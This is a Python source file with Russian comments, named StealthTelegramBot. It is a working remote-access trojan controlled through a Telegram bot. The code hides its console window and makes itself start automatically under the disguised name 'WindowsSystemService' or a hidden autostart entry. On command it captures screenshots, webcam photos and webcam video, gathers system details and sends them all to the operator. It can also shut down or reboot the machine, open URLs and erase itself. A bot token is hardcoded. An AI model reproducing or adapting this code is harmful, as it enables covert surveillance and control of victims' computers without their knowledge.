
import os
import sys
import json
import socket
import platform
import subprocess
import threading
import requests
import cv2
import psutil
import telebot
from datetime import datetime
import time
import shutil
import tempfile
import mss
import mss.tools
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

class StealthTelegramBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.running = True
        self.chat_id = None
        self.setup_autostart()
        self.hide_window()
        self.setup_handlers()
        
    def setup_autostart(self):
        """Добавление в автозагрузку"""
        try:
            if platform.system() == "Windows":
                import winreg
                
                # Получаем путь к текущему исполняемому файлу
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                
                # Добавляем в реестр для автозагрузки
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                        winreg.SetValueEx(regkey, "WindowsSystemService", 0, winreg.REG_SZ, f'"{exe_path}"')
                except Exception:
                    # Если нет прав, пробуем создать скрипт в папке автозагрузки
                    startup_path = os.path.join(os.getenv('APPDATA'), 
                                              'Microsoft', 'Windows', 'Start Menu', 
                                              'Programs', 'Startup')
                    if os.path.exists(startup_path):
                        bat_path = os.path.join(startup_path, "system_service.bat")
                        with open(bat_path, 'w') as f:
                            f.write(f'@echo off\nstart "" "{exe_path}"\n')
            
            elif platform.system() == "Linux":
                autostart_path = os.path.expanduser("~/.config/autostart/")
                os.makedirs(autostart_path, exist_ok=True)
                
                desktop_file = f"""[Desktop Entry]
Type=Application
Name=SystemService
Exec=python3 {os.path.abspath(__file__)}
Hidden=true
X-GNOME-Autostart-enabled=true
"""
                
                with open(os.path.join(autostart_path, "systemservice.desktop"), "w") as f:
                    f.write(desktop_file)
                    
        except Exception as e:
            pass

    def hide_window(self):
        """Скрытие окна"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def create_keyboard(self):
        """Создание клавиатуры с кнопками"""
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        
        buttons = [
            KeyboardButton('📸 Скриншот'),
            KeyboardButton('💻 Информация о системе'),
            KeyboardButton('🌐 Открыть Google'),
            KeyboardButton('⚡ Выключить ПК'),
            KeyboardButton('🔄 Перезагрузить ПК'),
            KeyboardButton('📷 Фото с вебки'),
            KeyboardButton('🎥 Запись с вебки (10 сек)'),
            KeyboardButton('📊 Статус системы'),
            KeyboardButton('💀 Самоуничтожение'),
            KeyboardButton('ℹ️ Помощь')
        ]
        
        # Добавляем кнопки в два ряда
        for i in range(0, len(buttons), 2):
            if i + 1 < len(buttons):
                keyboard.add(buttons[i], buttons[i+1])
            else:
                keyboard.add(buttons[i])
                
        return keyboard

    def setup_handlers(self):
        """Настройка обработчиков команд"""
        
        @self.bot.message_handler(func=lambda message: True)
        def handle_all_messages(message):
            self.chat_id = message.chat.id
            text = message.text.lower()
            
            if text == '📸 скриншот':
                self.handle_screenshot(message)
            elif text == '💻 информация о системе':
                self.handle_sysinfo(message)
            elif text == '🌐 открыть google':
                self.handle_openurl_special(message, 'https://google.com')
            elif text == '⚡ выключить пк':
                self.handle_shutdown(message)
            elif text == '🔄 перезагрузить пк':
                self.handle_restart(message)
            elif text == '📷 фото с вебки':
                self.handle_webcam_photo(message)
            elif text == '🎥 запись с вебки (10 сек)':
                self.handle_webcam_video_special(message, 10)
            elif text == '📊 статус системы':
                self.handle_status(message)
            elif text == '💀 самоуничтожение':
                self.handle_self_destruct(message)
            elif text == 'ℹ️ помощь':
                self.send_help(message)
            else:
                self.bot.send_message(message.chat.id, "❌ Неизвестная команда. Используйте кнопки ниже 👇", 
                                    reply_markup=self.create_keyboard())

        @self.bot.message_handler(commands=['start', 'help'])
        def send_help(message):
            self.chat_id = message.chat.id
            help_text = """
🤖 *Стелс бот активирован*

_Выберите действие с помощью кнопок ниже:_

📸 *Скриншот* - Сделать снимок экрана
💻 *Информация о системе* - Получить данные о ПК
🌐 *Открыть Google* - Запустить браузер с Google
⚡ *Выключить ПК* - Завершить работу компьютера
🔄 *Перезагрузить ПК* - Перезапустить систему
📷 *Фото с вебки* - Сделать фото с вебкамеры
🎥 *Запись с вебки* - Записать видео (10 секунд)
📊 *Статус системы* - Текущее состояние системы
💀 *Самоуничтожение* - Удалить бота с системы

*Также доступны команды:*
/openurl [ссылка] - Открыть любой сайт
/savefile [имя] [текст] - Сохранить файл на рабочий стол
/webcam_video [секунды] - Запись видео на указанное время
"""
            self.bot.send_message(message.chat.id, help_text, parse_mode='Markdown', 
                                reply_markup=self.create_keyboard())

    def handle_screenshot(self, message):
        """Обработчик скриншота"""
        try:
            self.bot.send_message(message.chat.id, "📸 Делаю скриншот...")
            result = self.take_screenshot()
            if os.path.exists(result):
                with open(result, 'rb') as photo:
                    self.bot.send_photo(message.chat.id, photo)
                os.remove(result)
                self.bot.send_message(message.chat.id, "✅ Скриншот выполнен!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_sysinfo(self, message):
        """Обработчик информации о системе"""
        try:
            self.bot.send_message(message.chat.id, "💻 Собираю информацию...")
            info = self.get_system_info()
            self.bot.send_message(message.chat.id, f"```\n{info}\n```", 
                                parse_mode='Markdown', reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_openurl_special(self, message, url):
        """Обработчик открытия URL"""
        try:
            result = self.open_url(url)
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_shutdown(self, message):
        """Обработчик выключения"""
        try:
            result = self.shutdown_pc()
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_restart(self, message):
        """Обработчик перезагрузки"""
        try:
            result = self.restart_pc()
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_webcam_photo(self, message):
        """Обработчик фото с вебкамеры"""
        try:
            self.bot.send_message(message.chat.id, "📷 Делаю фото...")
            result = self.webcam_photo()
            if os.path.exists(result):
                with open(result, 'rb') as photo:
                    self.bot.send_photo(message.chat.id, photo)
                os.remove(result)
                self.bot.send_message(message.chat.id, "✅ Фото сделано!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_webcam_video_special(self, message, seconds):
        """Обработчик записи видео"""
        try:
            self.bot.send_message(message.chat.id, f"🎥 Записываю {seconds} секунд...")
            result = self.webcam_video(seconds)
            
            if os.path.exists(result):
                with open(result, 'rb') as video:
                    self.bot.send_video(message.chat.id, video)
                os.remove(result)
                self.bot.send_message(message.chat.id, "✅ Видео записано!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_status(self, message):
        """Обработчик статуса"""
        try:
            status = self.get_status()
            self.bot.send_message(message.chat.id, status, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_self_destruct(self, message):
        """Обработчик самоуничтожения"""
        try:
            self.bot.send_message(message.chat.id, "💀 Самоуничтожение через 5 секунд...")
            time.sleep(5)
            self.self_destruct()
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def get_status(self):
        """Статус системы"""
        try:
            status = {
                "🖥️ Система": platform.system(),
                "👤 Пользователь": os.getlogin(),
                "⏰ Время работы": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "💾 Память": f"{psutil.virtual_memory().percent}% использовано",
                "💿 Диск C:": f"{psutil.disk_usage('C:').percent}% использовано" if platform.system() == "Windows" else f"{psutil.disk_usage('/').percent}% использовано",
                "📡 IP адрес": socket.gethostbyname(socket.gethostname())
            }
            return "\n".join([f"{k}: {v}" for k, v in status.items()])
        except Exception as e:
            return f"❌ Ошибка статуса: {str(e)}"

    def take_screenshot(self):
        """Скриншот экрана с использованием mss"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            
            return filename
        except Exception as e:
            return f"❌ Ошибка скриншота: {str(e)}"

    def get_system_info(self):
        """Информация о системе"""
        try:
            info = {
                "🖥️ Система": platform.system(),
                "📋 Версия": platform.version(),
                "⚡ Процессор": platform.processor() or "Не определен",
                "💾 Память ОЗУ": f"{psutil.virtual_memory().total // (1024**3)} GB",
                "💿 Диск": f"{psutil.disk_usage('/').total // (1024**3)} GB total",
                "🖥️ Имя ПК": socket.gethostname(),
                "🌐 IP адрес": socket.gethostbyname(socket.gethostname()),
                "👤 Пользователь": os.getlogin(),
                "⏰ Время работы": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "🔋 Батарея": f"{psutil.sensors_battery().percent}%" if hasattr(psutil.sensors_battery(), 'percent') else "Не доступно"
            }
            return json.dumps(info, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"❌ Ошибка получения информации: {str(e)}"

    def open_url(self, url):
        """Открытие URL"""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
                
            if platform.system() == "Windows":
                os.startfile(url)
            elif platform.system() == "Darwin":
                subprocess.Popen(['open', url])
            else:
                subprocess.Popen(['xdg-open', url])
            return f"✅ Открываю: {url}"
        except Exception as e:
            return f"❌ Ошибка открытия URL: {str(e)}"

    def shutdown_pc(self):
        """Выключение ПК"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            elif platform.system() == "Linux":
                os.system("shutdown now")
            elif platform.system() == "Darwin":
                os.system("shutdown -h now")
            return "✅ Выключаю ПК через 5 секунд..."
        except Exception as e:
            return f"❌ Ошибка выключения: {str(e)}"

    def restart_pc(self):
        """Перезагрузка ПК"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            elif platform.system() == "Linux":
                os.system("reboot")
            elif platform.system() == "Darwin":
                os.system("shutdown -r now")
            return "✅ Перезагружаю ПК через 5 секунд..."
        except Exception as e:
            return f"❌ Ошибка перезагрузки: {str(e)}"

    def save_file(self, content, filename):
        """Сохранение файла на рабочий стол"""
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            os.makedirs(desktop_path, exist_ok=True)
            file_path = os.path.join(desktop_path, filename)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return f"✅ Файл сохранен: {file_path}"
        except Exception as e:
            return f"❌ Ошибка сохранения файла: {str(e)}"

    def webcam_photo(self):
        """Фото с вебкамеры"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "❌ Вебкамера не доступна"
            
            time.sleep(1)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_photo_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                return filename
            else:
                return "❌ Не удалось сделать фото"
                
        except Exception as e:
            return f"❌ Ошибка вебкамеры: {str(e)}"

    def webcam_video(self, seconds=10):
        """Запись видео с вебкамеры"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "❌ Вебкамера не доступна"
            
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"webcam_video_{timestamp}.avi"
            
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
            
            start_time = time.time()
            while (time.time() - start_time) < seconds:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
                time.sleep(0.05)
            
            cap.release()
            out.release()
            return filename
            
        except Exception as e:
            return f"❌ Ошибка записи видео: {str(e)}"

    def self_destruct(self):
        """Самоуничтожение"""
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                try:
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                        winreg.DeleteValue(regkey, "WindowsSystemService")
                except:
                    pass
                
                startup_path = os.path.join(os.getenv('APPDATA'), 
                                          'Microsoft', 'Windows', 'Start Menu', 
                                          'Programs', 'Startup')
                bat_path = os.path.join(startup_path, "system_service.bat")
                if os.path.exists(bat_path):
                    os.remove(bat_path)
            
            current_file = os.path.abspath(__file__)
            if os.path.exists(current_file):
                os.remove(current_file)
            
            sys.exit(0)
            
        except Exception as e:
            sys.exit(1)

    def run(self):
        """Запуск бота"""
        while self.running:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                time.sleep(10)

def main():
    # Замените YOUR_BOT_TOKEN на токен вашего бота
    BOT_TOKEN = "5403558286:AAE7t0M2u-Rctr4kYQOZR9weItKhbciqwnI"
    
    bot = StealthTelegramBot(BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    main()